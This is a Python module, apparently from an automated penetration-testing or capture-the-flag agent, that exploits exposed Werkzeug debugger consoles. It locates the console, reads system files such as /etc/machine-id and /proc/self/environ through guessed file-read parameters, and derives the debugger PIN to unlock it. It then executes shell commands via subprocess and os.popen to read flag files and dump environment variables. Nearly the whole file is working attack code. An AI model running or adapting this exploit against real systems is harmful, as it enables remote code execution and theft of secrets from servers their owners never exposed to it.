from __future__ import annotations

import hashlib
import re
import secrets
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import ProbeResponse, ProbeSession
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.web_core.proof_recognizer import recognize_proofs

_CONSOLE_PATHS: tuple[str, ...] = ("/console", "/", "/__debugger__")
_DEBUGGER_MARKERS = ("werkzeug debugger", "traceback (most recent call last)", "console-mode")
_SECRET_RE = re.compile(r'SECRET\s*=\s*"([A-Za-z0-9_-]+)"')
_FRAME_RE = re.compile(r"(?:frm=|frame-|\"frm\":\s*)(\d{1,20})")
_FLAG_PATHS = (
    "/FLAG",
    "/FLAG.txt",
    "/flag",
    "/flag.txt",
    "/tmp/FLAG",
    "/tmp/FLAG.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/app/FLAG",
    "/app/FLAG.txt",
    "/app/flag",
    "/app/flag.txt",
    "/var/www/html/FLAG",
    "/var/www/html/FLAG.txt",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/root/FLAG",
    "/root/FLAG.txt",
    "/root/flag",
    "/root/flag.txt",
)


def probe_werkzeug_console(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []

    console = _find_console(session, requests)
    if console is None:
        return ProbeRunResult(
            ok=False,
            probe="werkzeug_console",
            summary="no exposed Werkzeug debugger console found",
            findings=findings,
            requests=requests[:30],
        )
    url, secret, frames, eval_urls = console
    findings.append({"type": "werkzeug_console_exposed", "url": url, "has_secret": bool(secret)})
    if not secret:
        findings.append({"type": "werkzeug_console_locked", "url": url, "detail": "debugger page lacked a usable SECRET token"})
        return _result(findings, requests)

    token = "RAVAGE_WZ_" + secrets.token_hex(5)
    unlocked, eval_url, frame = _confirm_unlocked(session, eval_urls, secret, frames, token, requests)
    if not unlocked:
        _attempt_pin_unlock(session, state, eval_urls, secret, frames, token, findings, requests)
        unlocked, eval_url, frame = _confirm_unlocked(session, eval_urls, secret, frames, token, requests)
    if not unlocked:
        findings.append(
            {
                "type": "werkzeug_console_locked",
                "url": url,
                "detail": "console is PIN-protected and the PIN inputs were not available to compute it; abandoning",
            }
        )
        return _result(findings, requests)

    findings.append({"type": "werkzeug_console_unlocked", "url": eval_url, "console_url": url, "frame": frame})
    for code in _flag_commands(token):
        response = _eval(session, eval_url, secret, frame, code, requests)
        if response is not None and _record_proof(response.body, findings, url=eval_url):
            break
    return _result(findings, requests)


def _result(findings: list[dict[str, object]], requests: list[dict[str, object]]) -> ProbeRunResult:
    return ProbeRunResult(
        ok=bool(findings),
        probe="werkzeug_console",
        summary=f"findings={len(findings)}, requests={len(requests)}",
        findings=findings[:30],
        requests=requests[:40],
    )


# --- discovery ----------------------------------------------------------------


def _find_console(
    session: ProbeSession, requests: list[dict[str, object]]
) -> tuple[str, str, list[str], list[str]] | None:
    candidates: list[str] = list(_CONSOLE_PATHS)
    # Trigger an exception page too: a debug app renders the interactive debugger on error.
    candidates.append("/?__ravage_err=" + secrets.token_hex(3))
    for path in candidates:
        url = session.absolute(path)
        response = session.get(url)
        requests.append(response.summary(body_chars=200) | {"probe_kind": "werkzeug_probe", "url": url})
        if not _is_debugger(response.body):
            continue
        secret = _extract_secret(response.body)
        frames = _extract_frames(response.body)
        eval_urls = _eval_candidate_urls(session, url, response.body)
        return url, secret, frames, eval_urls
    return None


def _is_debugger(body: str) -> bool:
    lowered = body.lower()
    return any(marker in lowered for marker in _DEBUGGER_MARKERS) or "secret =" in lowered and "__debugger__" in lowered


def _extract_secret(body: str) -> str:
    match = _SECRET_RE.search(body)
    return match.group(1) if match else ""


def _extract_frames(body: str) -> list[str]:
    frames = _dedupe([match.group(1) for match in _FRAME_RE.finditer(body)])
    if "0" not in frames:
        frames.append("0")
    return frames[:4]


def _eval_candidate_urls(session: ProbeSession, console_url: str, body: str) -> list[str]:
    candidates = [console_url]
    candidates.extend(_debugger_resource_bases(console_url, body))
    parsed = urlsplit(console_url)
    origin = urlunsplit((parsed.scheme, parsed.netloc, "", "", ""))
    for path in ("/", "/console", "/__debugger__"):
        candidates.append(urljoin(origin + "/", path.lstrip("/")))
    scoped = []
    for value in candidates:
        absolute = session.absolute(value)
        if session.in_scope(absolute):
            scoped.append(_strip_query(absolute))
    return _dedupe(scoped)[:8]


def _debugger_resource_bases(console_url: str, body: str) -> list[str]:
    bases: list[str] = []
    for match in re.finditer(r"""(?is)(?:href|src)=["']([^"']*__debugger__=yes[^"']*)["']""", body):
        raw = html_unescape(match.group(1))
        full = urljoin(console_url, raw)
        bases.append(_strip_query(full))
    return bases


def html_unescape(value: str) -> str:
    return value.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")


def _strip_query(url: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, parts.path or "/", "", ""))


# --- eval ---------------------------------------------------------------------


def _confirm_unlocked(
    session: ProbeSession,
    urls: list[str],
    secret: str,
    frames: list[str],
    token: str,
    requests: list[dict[str, object]],
) -> tuple[bool, str, str]:
    probe_code = f"print('{token}')"
    for url in urls:
        for frame in frames:
            response = _eval(session, url, secret, frame, probe_code, requests)
            if response is not None and token in response.body:
                return True, url, frame
    return False, urls[0] if urls else "", frames[0] if frames else "0"


def _eval(
    session: ProbeSession,
    url: str,
    secret: str,
    frame: str,
    code: str,
    requests: list[dict[str, object]],
) -> ProbeResponse | None:
    query = f"__debugger__=yes&cmd={quote(code)}&frm={frame}&s={secret}"
    target = url + ("&" if "?" in url else "?") + query
    response = session.get(target)
    requests.append(
        response.summary(body_chars=240) | {"probe_kind": "werkzeug_eval", "frame": frame, "cmd": code[:160]}
    )
    return response


def _flag_commands(token: str) -> list[str]:
    command = "cat " + " ".join(_FLAG_PATHS) + f" 2>/dev/null; echo {token}"
    return [
        f"__import__('subprocess').check_output(['sh','-c',{command!r}]).decode()",
        f"__import__('os').popen({command!r}).read()",
        "__import__('os').environ",
    ]


def _record_proof(body: str, findings: list[dict[str, object]], *, url: str) -> bool:
    proofs = recognize_proofs(body)
    if not proofs:
        return False
    findings.append({"type": "werkzeug_console_extracted_proof", "url": url, "proof": proofs[0], "proofs": proofs})
    return True


# --- PIN computation ------------------------------------------------------------


def _attempt_pin_unlock(
    session: ProbeSession,
    state: AgentState,
    urls: list[str],
    secret: str,
    frames: list[str],
    token: str,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
) -> None:
    candidates = _pin_bit_candidates(session, state, requests)
    if not candidates:
        return
    tried: list[str] = []
    for bits in candidates[:32]:
        pin_args = {key: bits[key] for key in ("username", "modname", "appname", "modfile", "mac_decimal", "machine_id")}
        pin = compute_werkzeug_pin(**pin_args)
        if pin in tried:
            continue
        tried.append(pin)
        authed = False
        authed_url = urls[0] if urls else ""
        for url in urls:
            response = _eval_pinauth(session, url, secret, pin, requests)
            authed = response is not None and _pinauth_succeeded(response.body)
            authed_url = url
            if authed:
                break
        findings.append(
            {
                "type": "werkzeug_pin_attempt",
                "url": authed_url,
                "computed_pin": pin,
                "authenticated": bool(authed),
                "source": bits.get("source", "state_or_file_read"),
            }
        )
        if authed:
            break


def _pinauth_succeeded(body: str) -> bool:
    compact = re.sub(r"\s+", "", body.lower())
    return '"auth":true' in compact or "'auth':true" in compact


def _eval_pinauth(
    session: ProbeSession, url: str, secret: str, pin: str, requests: list[dict[str, object]]
) -> ProbeResponse | None:
    query = f"__debugger__=yes&cmd=pinauth&pin={quote(pin)}&s={secret}"
    target = url + ("&" if "?" in url else "?") + query
    response = session.get(target)
    requests.append(response.summary(body_chars=160) | {"probe_kind": "werkzeug_pinauth"})
    return response


def _pin_bit_candidates(
    session: ProbeSession,
    state: AgentState,
    requests: list[dict[str, object]],
) -> list[dict[str, str]]:
    text = " ".join(state.facts[-80:] + [str(v) for values in state.signals.values() for v in values[-30:]])
    material = _PinMaterial()
    material.update_from_text(text, source="state")
    material.update_from_responses(_collect_pin_material_responses(session, state, requests))
    return material.candidates()


class _PinMaterial:
    def __init__(self) -> None:
        self.machine_ids: list[str] = []
        self.boot_ids: list[str] = []
        self.cgroup_suffixes: list[str] = []
        self.macs: list[str] = []
        self.usernames: list[str] = []
        self.modfiles: list[str] = []
        self.python_versions: list[str] = []
        self.sources: list[str] = []

    def update_from_responses(self, values: list[tuple[str, str]]) -> None:
        for source, body in values:
            self.update_from_text(body, source=source)

    def update_from_text(self, text: str, *, source: str) -> None:
        if not text:
            return
        self.sources.append(source)
        for match in re.finditer(r"(?i)\b(?:machine[_-]?id[\"'=:\s]*)?([0-9a-f]{32,})\b", text):
            self.machine_ids.append(match.group(1).strip())
        for match in re.finditer(r"(?i)\b([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\b", text):
            self.boot_ids.append(match.group(1).strip())
        for line in text.splitlines():
            suffix = _cgroup_suffix(line)
            if suffix:
                self.cgroup_suffixes.append(suffix)
        for match in re.finditer(r"(?i)\b([0-9a-f]{2}(?::[0-9a-f]{2}){5})\b", text):
            mac = match.group(1).lower()
            if mac != "00:00:00:00:00:00":
                self.macs.append(mac)
        for pattern in (
            r"\bUSER=([A-Za-z0-9_.-]+)",
            r"\bLOGNAME=([A-Za-z0-9_.-]+)",
            r"\busername[\"'=:\s]+([A-Za-z0-9_.-]+)",
        ):
            for match in re.finditer(pattern, text, flags=re.IGNORECASE):
                self.usernames.append(match.group(1))
        for match in re.finditer(r"([/\w.-]+/flask/app\.py)", text):
            self.modfiles.append(match.group(1))
        for match in re.finditer(r"Python/(\d+\.\d+)", text):
            self.python_versions.append(match.group(1))

    def candidates(self) -> list[dict[str, str]]:
        machine_values = _dedupe(self.machine_ids + self.boot_ids)
        suffixes = _dedupe(self.cgroup_suffixes)
        if suffixes:
            machine_values = _dedupe(machine_values + [value + suffix for value in machine_values for suffix in suffixes])
        macs = _dedupe(self.macs)
        if not machine_values or not macs:
            return []
        usernames = _dedupe(self.usernames + ["root", "www-data", "flask", "app"])[:6]
        modfiles = _dedupe(self.modfiles + _candidate_flask_modfiles(self.python_versions))[:8]
        candidates: list[dict[str, str]] = []
        for machine_id in machine_values[:6]:
            for mac in macs[:4]:
                for username in usernames:
                    for modfile in modfiles:
                        candidates.append(
                            {
                                "username": username,
                                "modname": "flask.app",
                                "appname": "Flask",
                                "modfile": modfile,
                                "mac_decimal": str(int(mac.replace(":", ""), 16)),
                                "machine_id": machine_id,
                                "source": ",".join(_dedupe(self.sources)[-6:]),
                            }
                        )
        return candidates


def _candidate_flask_modfiles(python_versions: list[str]) -> list[str]:
    versions = _dedupe(python_versions + ["3.12", "3.11", "3.10", "3.9", "3.8", "3.7"])
    paths = ["/usr/local/lib/python3/site-packages/flask/app.py"]
    for version in versions:
        paths.extend(
            [
                f"/usr/local/lib/python{version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{version}/dist-packages/flask/app.py",
                f"/usr/lib/python{version}/site-packages/flask/app.py",
                f"/usr/lib/python{version}/dist-packages/flask/app.py",
            ]
        )
    return paths


def _collect_pin_material_responses(
    session: ProbeSession,
    state: AgentState,
    requests: list[dict[str, object]],
) -> list[tuple[str, str]]:
    responses: list[tuple[str, str]] = []
    read_paths = (
        "/etc/machine-id",
        "/proc/sys/kernel/random/boot_id",
        "/proc/self/cgroup",
        "/proc/self/environ",
        "/proc/1/cgroup",
        "/proc/1/environ",
        "/sys/class/net/eth0/address",
        "/sys/class/net/ens3/address",
        "/sys/class/net/enp0s3/address",
    )
    endpoints = _candidate_file_read_endpoints(session, state)
    params = _candidate_file_read_params(state)
    spent = 0
    for endpoint in endpoints:
        for param in params:
            for path in read_paths:
                for payload in (path, f"file://{path}"):
                    if spent >= 80:
                        return responses
                    url = _with_query_value(endpoint, param, payload)
                    if not session.in_scope(url):
                        continue
                    response = session.get(url)
                    spent += 1
                    requests.append(
                        response.summary(body_chars=180)
                        | {"probe_kind": "werkzeug_pin_material", "file_param": param, "path": path}
                    )
                    if response.ok and _pin_material_response_interesting(response.body):
                        responses.append((f"{param}:{path}", response.body[:20000]))
                        if _pin_material_complete(responses):
                            return responses
    return responses


def _candidate_file_read_endpoints(session: ProbeSession, state: AgentState) -> list[str]:
    values: list[str] = [session.target_url, session.absolute("/console"), session.absolute("/")]
    for endpoint in _surface_list(state, "endpoints"):
        if isinstance(endpoint, dict):
            values.append(str(endpoint.get("url") or ""))
        else:
            values.append(str(endpoint))
    for raw in state.signals.get("endpoints", []):
        values.append(str(raw))
    result: list[str] = []
    for value in values:
        if not value:
            continue
        absolute = session.absolute(value)
        if session.in_scope(absolute):
            result.append(absolute)
    return _dedupe(result)[:12]


def _candidate_file_read_params(state: AgentState) -> list[str]:
    values = ["file", "filename", "path", "page", "template", "name", "f"]
    for raw in state.signals.get("parameters", []):
        values.append(str(raw))
    for param in _surface_list(state, "parameters"):
        if isinstance(param, dict):
            values.append(str(param.get("name") or param.get("parameter") or ""))
        else:
            values.append(str(param))
    deduped = _dedupe([value for value in values if value])
    preferred = [value for value in deduped if value.lower() in {"file", "filename", "path", "page", "template", "f"}]
    fallback = [value for value in deduped if value not in preferred]
    return (preferred + fallback)[:10]


def _surface_list(state: AgentState, key: str) -> list[object]:
    value = state.surface.get(key)
    if not isinstance(value, list):
        return []
    return value


def _with_query_value(url: str, name: str, value: str) -> str:
    parts = urlsplit(url)
    query = [(key, raw) for key, raw in parse_qsl(parts.query, keep_blank_values=True) if key != name]
    query.append((name, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path or "/", urlencode(query), ""))


def _pin_material_response_interesting(body: str) -> bool:
    lowered = body.lower()
    if "werkzeug debugger" in lowered and "secret =" in lowered:
        return False
    return bool(
        re.search(r"(?i)\b[0-9a-f]{32,}\b", body)
        or re.search(r"(?i)\b[0-9a-f]{2}(?::[0-9a-f]{2}){5}\b", body)
        or "USER=" in body
        or "/docker/" in body
        or "kubepods" in body
    )


def _pin_material_complete(responses: list[tuple[str, str]]) -> bool:
    material = _PinMaterial()
    material.update_from_responses(responses)
    return bool(material.candidates())


def _cgroup_suffix(line: str) -> str:
    text = line.strip()
    if not text or "/" not in text:
        return ""
    suffix = text.rsplit("/", 1)[-1].strip()
    if not suffix or suffix == text:
        return ""
    if re.fullmatch(r"[A-Za-z0-9_.:-]{8,128}", suffix):
        return suffix
    return ""


def compute_werkzeug_pin(
    *, username: str, modname: str, appname: str, modfile: str, mac_decimal: str, machine_id: str
) -> str:
    """Reproduce Werkzeug's get_pin_and_cookie_name PIN derivation (9 digits)."""
    probably_public_bits = [username, modname, appname, modfile]
    private_bits = [mac_decimal, machine_id]
    digest = hashlib.sha1()
    for bit in [*probably_public_bits, *private_bits]:
        if not bit:
            continue
        digest.update(bit.encode("utf-8"))
    digest.update(b"cookiesalt")
    digest.update(b"pinsalt")
    return f"{int(digest.hexdigest(), 16):09d}"[:9]


# --- helpers ------------------------------------------------------------------


def _search(text: str, pattern: str) -> str:
    match = re.search(pattern, text, re.IGNORECASE)
    return match.group(1) if match else ""


def _dedupe(values: list[str]) -> list[str]:
    seen: set[str] = set()
    result: list[str] = []
    for value in values:
        if value and value not in seen:
            seen.add(value)
            result.append(value)
    return result
